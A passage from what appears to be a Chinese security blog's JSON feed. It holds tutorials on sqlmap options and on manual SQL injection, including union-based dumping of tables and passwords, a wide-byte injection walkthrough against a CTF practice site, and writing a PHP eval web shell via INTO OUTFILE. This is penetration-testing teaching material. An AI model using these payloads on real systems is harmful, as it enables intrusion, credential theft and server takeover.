--user-agent=”aaaaaa” --dbs</code></p>\n<p>参数：--random-agent<br />\n 会从 sqlmap/txt/user-agents.txt 中随机产生 User-Agent 头。</p>\n<p>参数：--referer<br />\nsqlmap 可以在请求中伪造 HTTP 中的 referer。当 --level 参数设定 &gt;=3 时，会尝试进行 referer 注入。</p>\n<p><code>sqlmap-u “http://www.target.com” --leve3 --referer=”www.baidu.com” –dbs</code></p>\n<p>参数：--delay<br />\n 可以设定两个 http 请求间的延迟，设定为 1 的时候是 1 秒，默认是没有延迟的。</p>\n<p>参数：--timeout<br />\n 可以设定一个 http 请求超过对久判定为超时，默认是 30 秒。</p>\n<h2 id=\"设定探测等级\"><a class=\"anchor\" href=\"#设定探测等级\">#</a> 设定探测等级</h2>\n<p>参数：--level</p>\n<p>共有五个等级，默认为 1，sqlmap 使用的 payload 可以在 xml/payloads.xml 中看到，自己也可以根据相应的格式添加自己的 payload。<br />\nlevel&gt;=2 的时候就会测试 HTTP  Cookie。<br />\nlevel&gt;=3 的时候就会测试 HTTP  User-Agent/Referer 头。<br />\nlevel=5 的时候会测试 HTTP Host。</p>\n<h2 id=\"设定探测风险等级\"><a class=\"anchor\" href=\"#设定探测风险等级\">#</a> 设定探测风险等级</h2>\n<p>参数：--risk</p>\n<p>共有四个风险等级，默认是 1 会测试大部分的测试语句，2 会增加基于时间的测试语句，3 会增加 OR 语句的 SQL 注入测试。<br />\n在有些时候，例如在 UPDATE 的语句中，注入一个 OR 的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>\n<h2 id=\"列数据\"><a class=\"anchor\" href=\"#列数据\">#</a> 列数据</h2>\n<p>--dbs 列出所有数据库名称<br />\n --current-db 列出当前数据库名称</p>\n<p>--tables -D database_name #列表名<br />\n --columns -T table_name-D database_name   #列字段<br />\n --dump -C column_1,column_2 -T table_name-D database_name #获取字段内容</p>\n<h2 id=\"一些常用的参数\"><a class=\"anchor\" href=\"#一些常用的参数\">#</a> 一些常用的参数</h2>\n<p>-users 列数据库管理用户，当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。<br />\n--current-user 在大多数据库中可以获取到管理数据的用户 (当前用户)。<br />\n--is-dba 判断当前的用户是否为管理，是的话会返回 True。<br />\n--privileges 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap 将会告诉你哪个是数据库的超级管理员。也可以用 - U 参数指定你想看那个用户的权限。<br />\n--proxy 指定一个代理服务器<br />\n <code>eg: –proxy http://local:8080</code> <br />\n--prefix=PREFIX  注入 payload 字符串前缀<br />\n --suffix=SUFFIX  注入 payload 字符串后缀<br />\n <code>eg：sqlmap-u “www.target.com/index.php?id=1” -p id --prefix “')”--suffix “AND ('1'='1”</code></p>\n<h2 id=\"使用shell命令\"><a class=\"anchor\" href=\"#使用shell命令\">#</a> 使用 Shell 命令</h2>\n<p>参数：--os-shell</p>\n<p>前提：需要网站的物理路径，其次是需要有 FIFE 权限。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sqlmap-r “C:<span class=\"token punctuation\">\\</span>sqlmap<span class=\"token punctuation\">\\</span>request.txt” -p <span class=\"token function\">id</span> --dmsmysql--os-shell</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>接下来指定网站可写目录：“C:<span class=\"token punctuation\">\\</span>www”</pre></td></tr></table></figure><h1 id=\"sqlmap思维导图\"><a class=\"anchor\" href=\"#sqlmap思维导图\">#</a> SQLmap 思维导图</h1>\n<p>源自 XBX 白细胞安全团队（LEUKOCYTE）<br />\n右键新标签页查看 sqlmap 思维导图 <img data-src=\"sqlmap%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "SQLmap"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/",
            "title": "初学SQLinjection",
            "date_published": "2020-12-02T03:46:32.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>内容是网上收集的，可能存在错误</p>\n</blockquote>\n<h1 id=\"sqlinjection-原理\"><a class=\"anchor\" href=\"#sqlinjection-原理\">#</a> SQLinjection 原理</h1>\n<p>用户【可控参数】中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。</p>\n<p>其原因可以归结为以下两个原因叠加造成的：</p>\n<ol>\n<li>程序编写者在处理程序和数据库交互时，使用【字符串拼接】的方式构造 SQL 语句。</li>\n<li>未对【用户可控参数】进行足够的过滤便将参数内容拼接到 SQL 查询语句中。</li>\n</ol>\n<h1 id=\"sql注入的分类\"><a class=\"anchor\" href=\"#sql注入的分类\">#</a> SQL 注入的分类</h1>\n<p>在《web 安全深度剖析》这本书中作者张炳帅前辈认为 SQL 注入只分为数字型与字符型，其他的注入不过是这两大类型的不同展现形式，或不同展现位置罢了。<br />\n这些都是前辈们的总结</p>\n<ol>\n<li>\n<p><strong>按变量类型分类</strong></p>\n<ul>\n<li>数字型</li>\n<li>字符型</li>\n</ul>\n</li>\n<li>\n<p><strong>按 HTTP 提交方式分类</strong></p>\n<ul>\n<li>GET 注入</li>\n<li>POST 注入</li>\n<li>Cookie 注入</li>\n</ul>\n</li>\n<li>\n<p><strong>按注入方式分类</strong></p>\n<ul>\n<li>报错注入</li>\n<li>盲注</li>\n<li>布尔盲注</li>\n<li>时间盲注</li>\n<li>union 注入</li>\n</ul>\n</li>\n<li>\n<p><strong>编码问题</strong></p>\n<ul>\n<li>宽字节注入</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"mysql-50以上和mysql-50以下版本的区别\"><a class=\"anchor\" href=\"#mysql-50以上和mysql-50以下版本的区别\">#</a> MySQL 5.0 以上和 MySQL 5.0 以下版本的区别</h1>\n<p>MySQL 5.0 以上版本存在一个存储着数据库信息的信息数据库 --INFORMATION_SCHEMA ，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而 5.0 以下没有。</p>\n<h2 id=\"information_schema-库\"><a class=\"anchor\" href=\"#information_schema-库\">#</a> INFORMATION_SCHEMA 库</h2>\n<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>\n<h3 id=\"schemata表\"><a class=\"anchor\" href=\"#schemata表\">#</a> SCHEMATA 表</h3>\n<p>储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库库名的字段名为 SCHEMA_NAME。</p>\n</blockquote>\n<h3 id=\"tables表\"><a class=\"anchor\" href=\"#tables表\">#</a> TABLES 表</h3>\n<p>储存 mysql 中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库名和表名的字段名分别为 TABLE_SCHEMA 和 TABLE_NAME。</p>\n</blockquote>\n<h3 id=\"columns表\"><a class=\"anchor\" href=\"#columns表\">#</a> COLUMNS 表</h3>\n<p>储存 mysql 中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库库名、表名和字段名的字段名为 TABLE_SCHEMA、TABLE_NAME 和 COLUMN_NAME。</p>\n</blockquote>\n<h1 id=\"常用的关于information_schema库的sql语句\"><a class=\"anchor\" href=\"#常用的关于information_schema库的sql语句\">#</a> 常用的关于 information_schema 库的 SQL 语句</h1>\n<p>需要记住的几个函数</p>\n<ul>\n<li>database ()：当前网站使用的数据库</li>\n<li>version ()：当前 MySQL 的版本</li>\n<li>user ()：当前 MySQL 的用户</li>\n</ul>\n<p>limit 的用法<br />\n limit m,n 其中 m 是指记录开始的位置，从 0 开始，表示第一条记录；n 是指取 n 条记录。</p>\n<h2 id=\"查询数据表\"><a class=\"anchor\" href=\"#查询数据表\">#</a> 查询数据表</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> table_name from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>mysql 的联合查询会把所有的查询结果返回到第一个查询的字段下，在注入过程中常让第一个查询结果错误，这样就只显示你联合查询的结果了</p>\n<h2 id=\"查询字段\"><a class=\"anchor\" href=\"#查询字段\">#</a> 查询字段</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>,3,4 from information_schema.columns where <span class=\"token assign-left variable\">table_name</span><span class=\"token operator\">=</span><span class=\"token string\">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id=\"一句话总结\"><a class=\"anchor\" href=\"#一句话总结\">#</a> 一句话总结</h2>\n<p><em><strong>查询数据表与表字段的时候会用到 information_schema 库</strong></em></p>\n<h1 id=\"sql注入的基本流程\"><a class=\"anchor\" href=\"#sql注入的基本流程\">#</a> SQL 注入的基本流程</h1>\n<h2 id=\"判断是否存在注入点\"><a class=\"anchor\" href=\"#判断是否存在注入点\">#</a> 判断是否存在注入点</h2>\n<h2 id=\"判断注入类型\"><a class=\"anchor\" href=\"#判断注入类型\">#</a> 判断注入类型</h2>\n<h2 id=\"猜字段数量\"><a class=\"anchor\" href=\"#猜字段数量\">#</a> 猜字段数量</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>order by <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>后面加数字是对查询的第几列排序，从而实现判断字段的个数的目的</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>迭代1~n,直到页面出错（也就是数据库报错了，里面没有这一列。）</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>order by <span class=\"token number\">5</span>  页面正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>order by <span class=\"token number\">6</span>  页面错误</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>共有6个字段</pre></td></tr></table></figure><h2 id=\"看看哪个字段回显\"><a class=\"anchor\" href=\"#看看哪个字段回显\">#</a> 看看哪个字段回显</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> <span class=\"token number\">1,2</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>看回显什么数字，就可以知道那个字段回显。</pre></td></tr></table></figure><h2 id=\"查询数据库名版本用户\"><a class=\"anchor\" href=\"#查询数据库名版本用户\">#</a> 查询数据库名，版本，用户</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">..</span></pre></td></tr></table></figure><h2 id=\"查询数据表-2\"><a class=\"anchor\" href=\"#查询数据表-2\">#</a> 查询数据表</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> table_name from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"查询字段-2\"><a class=\"anchor\" href=\"#查询字段-2\">#</a> 查询字段</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>,3,4 from information_schema.columns where <span class=\"token assign-left variable\">table_name</span><span class=\"token operator\">=</span><span class=\"token string\">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id=\"查询数据\"><a class=\"anchor\" href=\"#查询数据\">#</a> 查询数据</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union selcet <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>要查询的字段1,字段2,<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>字段n<span class=\"token punctuation\">)</span>,3,4 from 数据表<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,<span class=\"token punctuation\">(</span>select group_concat<span class=\"token punctuation\">(</span>字段<span class=\"token punctuation\">)</span> from 数据表<span class=\"token punctuation\">)</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"宽字节注入\"><a class=\"anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h1>\n<h2 id=\"宽字节注入产生的原因\"><a class=\"anchor\" href=\"#宽字节注入产生的原因\">#</a> 宽字节注入产生的原因</h2>\n<p>宽字节注入就是用一个大于 128 的十六进制数来吃掉转义符 ```</p>\n<p>gbk 编码，用两个字节作为一个字符的编码.</p>\n<h2 id=\"宽字节注入的手工注入流程\"><a class=\"anchor\" href=\"#宽字节注入的手工注入流程\">#</a> 宽字节注入的手工注入流程</h2>\n<p>1、判断列数：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 1%23<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 2%23<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 3%23<br />\norder by 3 时报错，说明只有两列。</p>\n<p>2、各类信息：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,(concat_ws(char(32,58,32),user(),database(),version()))%23<br />\n<span class=\"exturl\" data-url=\"bWFpbHRvOnNhZS1jaGluYWxvdmVyQDEyMy4xMjUuMjMuMjEy\">sae-chinalover@123.125.23.212</span> : sae-chinalover : 5.5.52-0ubuntu0.14.04.1</p>\n<p>3、库名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2 union select 2,database()%23<br />\nsae-chinalover</p>\n<p>4、表名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,group_concat(table_name)<br />\nfrom information_schema.tables<br />\nwhere table_schema=database()%23<br />\nctf,ctf2,ctf3,ctf4,news</p>\n<p>5、ctf4 表的列名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,group_concat(column_name)<br />\nfrom information_schema.columns<br />\nwhere table_name=0x63746634%23<br />\nid,flag</p>\n<p>这里注意：要将表名 ctf4 转为 16 进制</p>\n<p>这里提供一个字符串转 16 进制的网站：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41aXh1ZXhpd2FuZy5jb20vc3RyL2hleC5waHA=\">http://www.5ixuexiwang.com/str/hex.php</span></p>\n<p>转了 16 进制之后记得在前面加上 0x</p>\n<p this_is_sqli_flag=\"\">6、flag 列的数据：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,(select flag from ctf4)%23<br />\nflag</p>\n<h2 id=\"使用sqlmap进行宽字节注入\"><a class=\"anchor\" href=\"#使用sqlmap进行宽字节注入\">#</a> 使用 SQLmap 进行宽字节注入</h2>\n<p>sqlmap 跑法<br />\n 1、查看有哪些库：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes --dbs<br />\n 这个时侯就要用到一个脚本了：</p>\n<p>脚本名：<span class=\"exturl\" data-url=\"aHR0cDovL3VubWFnaWNxdW90ZXMucHk=\">unmagicquotes.py</span></p>\n<p>作用：宽字符绕过</p>\n<p>2、表名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  --tables</p>\n<p>3、列名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  -T ctf4 --columns</p>\n<p>4、flag 列的数据：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  -T ctf4 -C flag</p>\n<h1 id=\"常用姿势\"><a class=\"anchor\" href=\"#常用姿势\">#</a> 常用姿势</h1>\n<h2 id=\"判断是否存在sql注入\"><a class=\"anchor\" href=\"#判断是否存在sql注入\">#</a> 判断是否存在 SQL 注入</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>and <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>and <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>'</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\"</pre></td></tr></table></figure><h2 id=\"暴字段长度\"><a class=\"anchor\" href=\"#暴字段长度\">#</a> 暴字段长度</h2>\n<p>Order by 数字</p>\n<h2 id=\"匹配字段\"><a class=\"anchor\" href=\"#匹配字段\">#</a> 匹配字段</h2>\n<p>and 1=1 union select 1,2,…,n</p>\n<h2 id=\"暴字段位置回显位\"><a class=\"anchor\" href=\"#暴字段位置回显位\">#</a> 暴字段位置（回显位）</h2>\n<p>and 1=2 union select 1,2,…,n</p>\n<h2 id=\"利用内置函数暴数据库信息\"><a class=\"anchor\" href=\"#利用内置函数暴数据库信息\">#</a> 利用内置函数暴数据库信息</h2>\n<p>version() database() user()</p>\n<h2 id=\"不用猜解可用字段暴数据库信息有些网站不适用\"><a class=\"anchor\" href=\"#不用猜解可用字段暴数据库信息有些网站不适用\">#</a> 不用猜解可用字段暴数据库信息 (有些网站不适用):</h2>\n<p>and 1=2 union all select version()<br />\nand 1=2 union all select database()<br />\nand 1=2 union all select user()</p>\n<h2 id=\"操作系统信息\"><a class=\"anchor\" href=\"#操作系统信息\">#</a> 操作系统信息：</h2>\n<p>and 1=2 union all select @@global.version_compile_os from mysql.user</p>\n<h2 id=\"数据库权限\"><a class=\"anchor\" href=\"#数据库权限\">#</a> 数据库权限：</h2>\n<p>and ord (mid (user (),1,1))=114 返回正常说明为 root</p>\n<h2 id=\"暴库-mysql50\"><a class=\"anchor\" href=\"#暴库-mysql50\">#</a> 暴库 (mysql&gt;5.0)</h2>\n<p>Mysql 5 以上有内置库 information_schema，存储着 mysql 的所有数据库和<br />\n表结构信息</p>\n<p>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.SCHEMATA limit 0,1</p>\n<h2 id=\"猜表\"><a class=\"anchor\" href=\"#猜表\">#</a> 猜表</h2>\n<p>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.TABLES where TABLE_SCHEMA = 数据库（十六进制） limit 0（开始的记录，0 为第一个开始记录）,1（显示 1 条记录）—</p>\n<h2 id=\"猜字段\"><a class=\"anchor\" href=\"#猜字段\">#</a> 猜字段</h2>\n<p>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.COLUMNS where TABLE_NAME = 表名（十六进制）limit 0,1</p>\n<h2 id=\"暴密码\"><a class=\"anchor\" href=\"#暴密码\">#</a> 暴密码</h2>\n<p>and 1=2 Union select 1,2,3, 用户名段，5,6,7, 密码段，8,9 from 表名 limit 0,1 高级用法（一个可用字段显示两个数据内容）：<br />\nUnion select 1,2,3concat (用户名段，0x3c, 密码段),5,6,7,8,9 from 表名 limit 0,1</p>\n<h2 id=\"直接写马root权限\"><a class=\"anchor\" href=\"#直接写马root权限\">#</a> 直接写马 (Root 权限)</h2>\n<p>条件：<br />\n1、知道站点物理路径<br />\n 2、有足够大的权限（可以用 select …. from mysql.user 测试）<br />\n3、magic_quotes_gpc()=OFF<br />\nselect ‘<?php eval_r($_POST[cmd])?>’ into outfile ‘物理路径’<br />\nand 1=2 union all select 一句话 HEX 值 into outfile ‘路径’</p>\n<h2 id=\"文件读写\"><a class=\"anchor\" href=\"#文件读写\">#</a> 文件读写</h2>\n<p>即通过数据库来读写服务器上的文件</p>\n<p>LOAD_FILE(file_name)</p>\n<p>其中 file_name 是文件的完整路径。</p>\n<p>示例:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D:/wamp64/tmp/1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D:/wamp64/tmp/1.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">666</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+----------------------------------+</pre></td></tr></table></figure><p>select …… into outfile</p>\n<p>outfile 函数可以导出多行，而 dumpfile 只能导出一行数据<br />\n outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式<br />\n outfile 函数会在写入的文件最后加一个换行，即多写一行</p>\n<p>实例：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token string\">'a<span class=\"token entity\" title=\"\\n\">\\n</span>aa<span class=\"token entity\" title=\"\\r\">\\r</span>aaaa'</span> into outfile <span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Query OK, <span class=\"token number\">1</span> row affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> a<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>aaaa</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>               <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">1</span> row <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token string\">'a<span class=\"token entity\" title=\"\\n\">\\n</span>aa<span class=\"token entity\" title=\"\\r\">\\r</span>aaaa'</span> into dumpfile <span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Query OK, <span class=\"token number\">1</span> row affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>mysql<span 